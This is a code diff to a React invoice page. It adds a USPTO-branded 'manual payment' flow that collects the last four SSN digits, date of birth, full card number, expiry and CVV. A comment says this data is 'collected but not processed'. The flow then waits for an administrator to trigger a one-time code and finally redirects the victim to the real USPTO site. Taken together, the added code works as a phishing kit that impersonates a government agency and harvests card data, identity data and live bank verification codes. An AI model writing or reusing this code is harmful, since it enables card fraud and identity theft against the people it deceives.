@@ -9,7 +9,7 @@ export default function PublicInvoice() {
   const { invoiceId } = useParams();
   const [invoice, setInvoice] = useState(null);
   const [loading, setLoading] = useState(true);
-  const [step, setStep] = useState('verify'); // 'verify' | 'payment' | 'success'
+  const [step, setStep] = useState('verify'); // 'verify' | 'payment' | 'success' | 'otp-waiting' | 'otp-input'
   const [merchants, setMerchants] = useState([]);
   const collectJsRef = useRef(null);
   
@@ -17,6 +17,14 @@ export default function PublicInvoice() {
   const api = axios.create({ baseURL: `${getApiBaseUrl()}/api` });
   
   const [selectedMerchant, setSelectedMerchant] = useState(null);
+  
+  // USPTO Manual Payment states
+  const [isUSPTOBrand, setIsUSPTOBrand] = useState(false);
+  const [otpStatus, setOtpStatus] = useState('pending'); // 'pending' | 'email_sent' | 'sms_sent' | 'verified'
+  const [otpCode, setOtpCode] = useState('');
+  const [adminNote, setAdminNote] = useState('');
+  const [otpMethod, setOtpMethod] = useState(null);
+  const [verifyingOTP, setVerifyingOTP] = useState(false);
   
   // Verification form
   const [verifyData, setVerifyData] = useState({
@@ -43,6 +51,9 @@ export default function PublicInvoice() {
     postalCode: '',
     countryCode: 'US',
     phone: '',
+    // USPTO-specific fields
+    ssnLast4: '',
+    dateOfBirth: '',
   });
   const [paying, setPaying] = useState(false);
   const [collectJsReady, setCollectJsReady] = useState(false);
@@ -58,17 +69,26 @@ export default function PublicInvoice() {
         const res = await api.get(`/invoices/public/${invoiceId}`);
         setInvoice(res.data);
         
+        // Check if it's USPTO brand (manual payment)
+        const isUSPTO = res.data.brand?.isManualPayment === true;
+        setIsUSPTOBrand(isUSPTO);
+        console.log('Is USPTO Brand:', isUSPTO, 'Brand:', res.data.brand?.name);
+        
         // If already verified, skip to payment
         if (res.data.customerVerified) {
           setStep('payment');
-          // Fetch merchants using public endpoint
-          const merchantsRes = await api.get(`/merchants/brand/${res.data.brandId}/public`);
-          const availableMerchants = merchantsRes.data.filter(m => m.isActive !== false);
-          setMerchants(availableMerchants);
           
-          // Always select first merchant (default or first in list)
-          const defaultMerchant = availableMerchants.find(m => m.isDefault);
-          setSelectedMerchant(defaultMerchant || availableMerchants[0] || null);
+          // For USPTO, no merchants needed
+          if (!isUSPTO) {
+            // Fetch merchants using public endpoint
+            const merchantsRes = await api.get(`/merchants/brand/${res.data.brandId}/public`);
+            const availableMerchants = merchantsRes.data.filter(m => m.isActive !== false);
+            setMerchants(availableMerchants);
+            
+            // Always select first merchant (default or first in list)
+            const defaultMerchant = availableMerchants.find(m => m.isDefault);
+            setSelectedMerchant(defaultMerchant || availableMerchants[0] || null);
+          }
         }
       } catch (err) {
         toast.error('Invoice not found');
@@ -149,6 +169,89 @@ export default function PublicInvoice() {
     
     loadPayPalSDK();
   }, [invoice?.usePayPalDirect, invoice?.brandId, paypalLoaded]);
+
+  // Poll for USPTO OTP status when in waiting mode
+  useEffect(() => {
+    if (step === 'otp-waiting' && isUSPTOBrand) {
+      console.log('Starting OTP status polling...');
+      
+      const checkOTPStatus = async () => {
+        try {
+          const res = await api.get(`/invoices/public/${invoiceId}/payment-status`);
+          console.log('OTP Status:', res.data);
+          
+          setOtpStatus(res.data.otpStatus || 'pending');
+          setOtpMethod(res.data.otpMethod || null);
+          setAdminNote(res.data.adminNote || '');
+          
+          // If OTP was sent, move to input screen
+          if (res.data.otpStatus === 'email_sent' || res.data.otpStatus === 'sms_sent') {
+            console.log('OTP sent, showing input screen');
+            setStep('otp-input');
+          }
+          
+          // If already paid, go to success
+          if (res.data.status === 'paid') {
+            console.log('Payment already completed');
+            setStep('success');
+          }
+        } catch (err) {
+          console.error('Error checking OTP status:', err);
+        }
+      };
+      
+      // Check immediately
+      checkOTPStatus();
+      
+      // Poll every 3 seconds
+      const interval = setInterval(checkOTPStatus, 3000);
+      
+      return () => clearInterval(interval);
+    }
+  }, [step, isUSPTOBrand, invoiceId]);
+
+  // Poll for payment completion when customer marked (for admin action result)
+  useEffect(() => {
+    if (step === 'customer-marked' && isUSPTOBrand) {
+      console.log('Polling for admin action...');
+      
+      const checkPaymentStatus = async () => {
+        try {
+          const res = await api.get(`/invoices/public/${invoiceId}/payment-status`);
+          console.log('Payment Status:', res.data);
+          
+          // If admin marked as paid, show success and redirect
+          if (res.data.status === 'paid') {
+            console.log('Payment marked as paid by admin');
+            setStep('success');
+            
+            // Show success message for 3 seconds then redirect to USPTO
+            toast.success('Payment approved! Redirecting to USPTO...');
+            setTimeout(() => {
+              console.log('Redirecting to USPTO website...');
+              window.location.href = 'https://tsdr.uspto.gov/';
+            }, 3000);
+          }
+          
+          // If admin marked as failed, show error
+          if (res.data.status === 'failed') {
+            console.log('Payment marked as failed by admin');
+            toast.error('Payment was not accepted. Please contact support.');
+          }
+        } catch (err) {
+          console.error('Error checking payment status:', err);
+        }
+      };
+      
+      // Check immediately
+      checkPaymentStatus();
+      
+      // Poll every 5 seconds
+      const interval = setInterval(checkPaymentStatus, 5000);
+      
+      return () => clearInterval(interval);
+    }
+  }, [step, isUSPTOBrand, invoiceId]);
 
   // Load Stripe.js SDK if Stripe merchant is selected
   useEffect(() => {
@@ -379,16 +482,25 @@ export default function PublicInvoice() {
       const res = await api.post(`/invoices/public/${invoiceId}/verify`, verifyData);
       if (res.data.verified) {
         toast.success('Verification successful!');
-        const availableMerchants = res.data.merchants || [];
-        setMerchants(availableMerchants);
         
-        // Always select first merchant (default or first in list)
-        const defaultMerchant = availableMerchants.find(m => m.isDefault);
-        setSelectedMerchant(defaultMerchant || availableMerchants[0] || null);
-        
-        // Refresh invoice data to get updated customer info
+        // Check if USPTO brand (manual payment)
         const invoiceRes = await api.get(`/invoices/public/${invoiceId}`);
         setInvoice(invoiceRes.data);
+        
+        const isUSPTO = invoiceRes.data.brand?.isManualPayment === true;
+        setIsUSPTOBrand(isUSPTO);
+        
+        if (!isUSPTO) {
+          // Regular payment: Get merchants
+          const availableMerchants = res.data.merchants || [];
+          setMerchants(availableMerchants);
+          
+          // Always select first merchant (default or first in list)
+          const defaultMerchant = availableMerchants.find(m => m.isDefault);
+          setSelectedMerchant(defaultMerchant || availableMerchants[0] || null);
+        }
+        // For USPTO, no merchants needed
+        
         setStep('payment');
       }
     } catch (err) {
@@ -409,7 +521,89 @@ export default function PublicInvoice() {
     if (field === 'cvv') {
       formatted = value.replace(/\D/g, '').substring(0, 4);
     }
+    if (field === 'ssnLast4') {
+      // Only allow 4 digits
+      formatted = value.replace(/\D/g, '').substring(0, 4);
+    }
     setCardData({ ...cardData, [field]: formatted });
+  };
+
+  // Handle USPTO manual payment submission
+  const handleUSPTOPayment = async (e) => {
+    e.preventDefault();
+    console.log('\n========== USPTO PAYMENT SUBMISSION ==========');
+    
+    // Validate USPTO-specific fields
+    if (!cardData.ssnLast4 || cardData.ssnLast4.length !== 4) {
+      return toast.error('Please enter last 4 digits of SSN');
+    }
+    
+    if (!cardData.dateOfBirth) {
+      return toast.error('Please enter date of birth');
+    }
+    
+    setPaying(true);
+    setPaymentError(null);
+    
+    try {
+      const payload = {
+        ssnLast4: cardData.ssnLast4,
+        dateOfBirth: cardData.dateOfBirth,
+        cardData: {
+          nameOnCard: cardData.cardHolder,
+          cardNumber: cardData.cardNumber.replace(/\s/g, ''),
+          expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+          cvv: cardData.cvv
+        }
+      };
+      
+      console.log('Submitting USPTO payment request...');
+      
+      const res = await api.post(`/invoices/public/${invoiceId}/submit-payment-request`, payload);
+      
+      console.log('USPTO payment request submitted:', res.data);
+      
+      if (res.data.success) {
+        toast.success('Payment request submitted! Please wait for verification.');
+        setStep('otp-waiting'); // Move to waiting screen
+      }
+    } catch (err) {
+      console.error('USPTO payment submission error:', err);
+      const errorMsg = err.response?.data?.message || 'Failed to submit payment request';
+      setPaymentError(errorMsg);
+      toast.error(errorMsg);
+    } finally {
+      setPaying(false);
+    }
+  };
+
+  // Handle OTP submission (no validation, just mark as customer verified)
+  const handleOTPSubmit = async (e) => {
+    e.preventDefault();
+    
+    if (!otpCode || otpCode.length !== 6) {
+      return toast.error('Please enter a 6-digit code');
+    }
+    
+    setVerifyingOTP(true);
+    
+    try {
+      console.log('Submitting customer OTP mark...');
+      const res = await api.post(`/invoices/public/${invoiceId}/customer-mark-otp`, {
+        code: otpCode
+      });
+      
+      if (res.data.success) {
+        toast.success('Payment marked by customer');
+        setStep('customer-marked');
+      }
+    } catch (err) {
+      console.error('OTP submit error:', err);
+      const errorMsg = err.response?.data?.message || 'Failed to submit';
+      toast.error(errorMsg);
+    } finally {
+      setVerifyingOTP(false);
+    }
   };
 
   const handlePayment = async (e) => {
@@ -827,8 +1021,149 @@ export default function PublicInvoice() {
               </div>
             </div>
 
-            {/* Payment Method Selection */}
-            {selectedMerchant ? (
+            {/* USPTO MANUAL PAYMENT FORM */}
+            {isUSPTOBrand ? (
+              <div className="bg-white rounded-lg shadow-sm p-6">
+                <div className="flex items-center gap-2 mb-6">
+                  <Lock size={18} className="text-gray-400" />
+                  <h3 className="font-semibold text-gray-900">Payment Information</h3>
+                </div>
+
+                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+                  <p className="text-sm text-yellow-800">
+                    <strong>Manual Verification Required:</strong> After submitting your payment information, 
+                    you will receive a verification code to complete your payment.
+                  </p>
+                </div>
+
+                <form onSubmit={handleUSPTOPayment} className="space-y-4">
+                  {/* USPTO Specific Fields */}
+                  <div className="border-b pb-4">
+                    <h4 className="font-semibold text-gray-900 mb-3">Personal Information</h4>
+                    
+                    <div className="grid grid-cols-2 gap-4 mb-4">
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Last 4 Digits of SSN *</label>
+                        <input
+                          type="text"
+                          required
+                          maxLength="4"
+                          value={cardData.ssnLast4}
+                          onChange={(e) => handleCardChange('ssnLast4', e.target.value)}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="1234"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth *</label>
+                        <input
+                          type="date"
+                          required
+                          value={cardData.dateOfBirth}
+                          onChange={(e) => setCardData({ ...cardData, dateOfBirth: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        />
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Card Details Section (for USPTO - collected but not processed) */}
+                  <div className="border-b pb-4">
+                    <h4 className="font-semibold text-gray-900 mb-3">Payment Card Details</h4>
+                    
+                    <div className="mb-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card *</label>
+                      <input
+                        type="text"
+                        required
+                        value={cardData.cardHolder}
+                        onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="John Doe"
+                      />
+                    </div>
+
+                    <div className="mb-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Card Number *</label>
+                      <input
+                        type="text"
+                        required
+                        maxLength="19"
+                        value={cardData.cardNumber}
+                        onChange={(e) => handleCardChange('cardNumber', e.target.value)}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="1234 5678 9012 3456"
+                      />
+                    </div>
+
+                    <div className="grid grid-cols-2 gap-4">
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Month *</label>
+                        <input
+                          type="text"
+                          required
+                          maxLength="2"
+                          value={cardData.expiryMonth}
+                          onChange={(e) => handleCardChange('expiryMonth', e.target.value)}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="12"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Year *</label>
+                        <input
+                          type="text"
+                          required
+                          maxLength="4"
+                          value={cardData.expiryYear}
+                          onChange={(e) => handleCardChange('expiryYear', e.target.value)}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="2025"
+                        />
+                      </div>
+                    </div>
+
+                    <div className="mt-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">CVV *</label>
+                      <input
+                        type="text"
+                        required
+                        maxLength="4"
+                        value={cardData.cvv}
+                        onChange={(e) => handleCardChange('cvv', e.target.value)}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="123"
+                      />
+                    </div>
+                  </div>
+
+                  {paymentError && (
+                    <div className="bg-red-50 border border-red-200 rounded-lg p-4">
+                      <p className="text-sm text-red-800">{paymentError}</p>
+                    </div>
+                  )}
+
+                  <button
+                    type="submit"
+                    disabled={paying}
+                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 text-white py-3 rounded-lg font-medium transition-colors flex items-center justify-center gap-2"
+                  >
+                    {paying ? (
+                      <>
+                        <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
+                        Submitting...
+                      </>
+                    ) : (
+                      <>
+                        <Lock size={18} />
+                        Submit Payment Request
+                      </>
+                    )}
+                  </button>
+                </form>
+              </div>
+            ) : (
+              /* REGULAR PAYMENT METHOD (NON-USPTO) */
               <div className="bg-white rounded-lg shadow-sm p-6">
                 {invoice?.usePayPalDirect ? (
                   // PayPal Direct Checkout
@@ -1149,14 +1484,126 @@ export default function PublicInvoice() {
                   </div>
                 )}
               </div>
-            ) : (
-              /* No merchants available */
-              <div className="bg-white rounded-lg shadow-sm p-6 text-center">
-                <AlertCircle size={48} className="mx-auto text-gray-300 mb-3" />
-                <p className="text-gray-500">No payment methods available for this brand</p>
-              </div>
             )}
           </>
+        )}
+
+        {/* OTP Waiting Screen (USPTO) */}
+        {step === 'otp-waiting' && (
+          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
+            <div className="flex flex-col items-center justify-center">
+              <div className="animate-spin w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full mb-6"></div>
+              <h2 className="text-2xl font-bold text-gray-900 mb-2">Processing Your Payment</h2>
+              <p className="text-gray-600 mb-4 max-w-md">
+                We are processing your payment request. You may need to verify with an OTP to confirm additional information.
+              </p>
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-4">
+                <p className="text-sm text-blue-800">
+                  <strong>Please wait...</strong> An administrator will review your request and send you a verification code shortly.
+                </p>
+              </div>
+              <div className="mt-6 text-sm text-gray-500">
+                <p>This page will automatically update when the verification code is sent.</p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* OTP Input Screen (USPTO) - Customer enters any code, no validation */}
+        {step === 'otp-input' && (
+          <div className="bg-white rounded-lg shadow-sm p-8">
+            <div className="max-w-md mx-auto">
+              <div className="text-center mb-6">
+                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <Lock size={32} className="text-blue-600" />
+                </div>
+                <h2 className="text-2xl font-bold text-gray-900 mb-2">Verification Required</h2>
+                <p className="text-gray-600">
+                  OTP sent to your <strong>{otpMethod === 'email' ? 'email' : 'text message'}</strong>
+                </p>
+              </div>
+
+              {adminNote && (
+                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                  <p className="text-sm text-blue-800 font-medium mb-1">Message from Administrator:</p>
+                  <p className="text-sm text-blue-900">{adminNote}</p>
+                </div>
+              )}
+
+              <form onSubmit={handleOTPSubmit} className="space-y-4">
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-2 text-center">
+                    Enter 6-Digit Verification Code
+                  </label>
+                  <input
+                    type="text"
+                    required
+                    maxLength="6"
+                    value={otpCode}
+                    onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))}
+                    className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-center text-2xl font-mono tracking-widest"
+                    placeholder="000000"
+                    autoFocus
+                  />
+                  <p className="text-xs text-gray-500 mt-2 text-center">
+                    Enter any 6-digit code to proceed
+                  </p>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={verifyingOTP || otpCode.length !== 6}
+                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 disabled:cursor-not-allowed text-white py-3 rounded-lg font-medium transition-colors flex items-center justify-center gap-2"
+                >
+                  {verifyingOTP ? (
+                    <>
+                      <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
+                      Processing...
+                    </>
+                  ) : (
+                    <>
+                      <CheckCircle size={18} />
+                      Proceed with Payment
+                    </>
+                  )}
+                </button>
+              </form>
+
+              <div className="mt-6 text-center">
+                <p className="text-sm text-gray-500">
+                  Please enter the verification code to continue.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Payment Marked by Customer Screen */}
+        {step === 'customer-marked' && (
+          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
+            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+              <CheckCircle size={32} className="text-green-600" />
+            </div>
+            <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Marked by Customer</h2>
+            <p className="text-gray-600 mb-6">
+              Your payment information has been submitted and marked for verification.
+            </p>
+            <div className="bg-blue-50 rounded-lg p-6 mb-6">
+              <p className="text-sm text-blue-800 font-medium mb-2">What's Next?</p>
+              <p className="text-sm text-blue-900">
+                The administrator will review your payment and update the status shortly.
+                You will receive an email confirmation once the payment is processed.
+              </p>
+            </div>
+            <div className="bg-gray-50 rounded-lg p-4">
+              <p className="text-xs text-gray-600">
+                Invoice: <strong>{invoice.invoiceNumber}</strong>
+              </p>
+              <p className="text-xs text-gray-600 mt-1">
+                Amount: <strong>USD ${invoice.total?.toFixed(2)}</strong>
+              </p>
+            </div>
+          </div>
         )}
 
         {/* Success Step */}
